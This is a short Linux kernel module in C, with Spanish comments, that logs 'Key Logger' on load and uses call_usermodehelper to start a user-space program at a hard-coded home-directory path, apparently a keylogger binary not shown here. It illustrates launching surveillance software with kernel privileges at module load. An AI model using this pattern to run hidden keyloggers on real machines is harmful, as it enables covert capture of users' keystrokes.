#include <linux/module.h> /* Necesario en todos los modulos */
#include <linux/kernel.h> /* Necesario para alertas  e info como KERN_INFO */
#include <linux/init.h>   /* Necesario para las macros init y exit */

#define RUTA "/home/oscar/Documents/key/key"

static int externo(void){
  char *argv[]={RUTA,NULL};
  static char *envp[]={"HOME=/","TERM=linux","PATH=/sbin:/bin:/usr/sbin:/usr/bin",NULL};
  return call_usermodehelper(argv[0],argv,envp,UMH_WAIT_PROC);
}

static int __init inicio(void){
  printk(KERN_INFO "Key Logger \n");
  return externo();
}

static void __exit fin(void){
  printk(KERN_INFO "Adios, Mundo \n");
}


module_init(inicio);
module_exit(fin);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Yo lo escribi");
MODULE_DESCRIPTION("Abrete alv");
